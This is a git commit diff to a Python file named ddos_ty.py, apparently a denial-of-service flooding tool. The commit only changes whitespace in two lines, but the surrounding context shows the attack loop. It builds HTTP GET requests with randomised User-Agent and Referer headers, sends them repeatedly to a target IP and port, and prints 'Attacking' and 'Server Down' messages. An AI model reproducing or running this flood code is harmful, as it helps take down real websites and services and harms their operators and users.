d895394dd5d75509d38dffcada9cdb5bb8927d4f
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-31 03:13:10 +0300

    Update ddos_ty.py

--- ddos_ty.py
+++ ddos_ty.py
@@ -105,8 +105,8 @@ def start():
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
     reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
-    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
-    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+    content = "Content-Type: application/x-www-form-urlencoded\r\n"
+    length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
     target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
     main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
     while True:
@@ -117,7 +117,7 @@ def start():
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("\033[31m[+]\033[33m Attacking {0}:{1} |\033[32m Sent•> {2}".format(str(ip), int(port), xx))
+            print("\033[31m[+]\033[33m Attacking {0}:{1} |\033[32m Sent •> {2}".format(str(ip), int(port), xx))
         except:
             s.close()
             print("\033[36m[+]\033[33m Server Down\033[36m Sent •>\033[31m", xx)
